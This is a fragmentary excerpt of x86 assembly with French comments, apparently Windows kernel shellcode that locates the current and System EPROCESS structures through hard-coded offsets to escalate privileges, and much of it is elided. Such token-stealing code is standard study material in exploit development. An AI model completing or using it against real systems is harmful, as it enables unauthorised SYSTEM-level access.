...
find_current_eprocess:
	...
	mov eax, dword [eax + 0x38 + 0x10]      ;EAX = KTHREAD.ApcState.Process
	...
	xor ecx, ecx
	mov cl, 0xA0 ;EDX = offset EPROCESS.ActiveProcessLinks :: On stocke l'offset ici, plus commode
...
escaladate_privileges:
	; EBP = notre EPROCESS
	; EDX = System EPROCESS
	sub dl, 0xA0 ; On realigne pour avoir l'EPROCESS
...
it_is_done_folks:
	...
	;kd> ? 81863976 - nt
	;Evaluate expression: 280950 = 00044976	
	xor ebx, ebx
	inc ebx
	shl ebx, 18 ;EBX = 0x40000
